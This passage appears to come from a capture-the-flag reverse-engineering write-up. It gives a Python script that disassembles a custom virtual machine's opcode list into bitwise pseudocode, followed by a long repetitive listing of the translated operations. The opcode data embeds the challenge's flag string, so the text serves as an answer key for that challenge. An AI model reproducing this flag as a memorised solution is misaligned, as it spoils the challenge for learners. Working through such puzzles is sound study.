<span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, </span><br><span class="line">        <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, </span><br><span class="line">        <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x99</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x99</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x88</span>, <span class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> opcode:</span><br><span class="line">    <span class="keyword">match</span> code:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xa1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num - 1] = or_not_num &amp; or_num&quot;</span> )</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_num = b1 | b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xb2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_1 = ~b1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_2 = ~b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xf1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b1 = input[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num += 1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b2 = input[now_num]&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xd4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_not_num = not_2 | not_1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbf</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;save = last[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num+=1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x99</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num = 0&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbb</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num-1] = now_num + save - 1&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤§è‡´æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">now_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span class="line">b1 = <span class="built_in">input</span>[now_num]</span><br><span class="line">now_num += <span class="number">1</span></span><br><span class="line">b2 = <span class="built_in">input</span>[now_num]</span><br><span class="line">or_num = b1 | b2</span><br><span class="line">not_1 = ~b1</span><br><span class="line">not_2 = ~b2</span><br><span class="line">or_not_num = not_2 | not_1</span><br><span class="line">last[now_num - <span class="number">1</span>] = or_not_num &amp; or_num</span><br><span 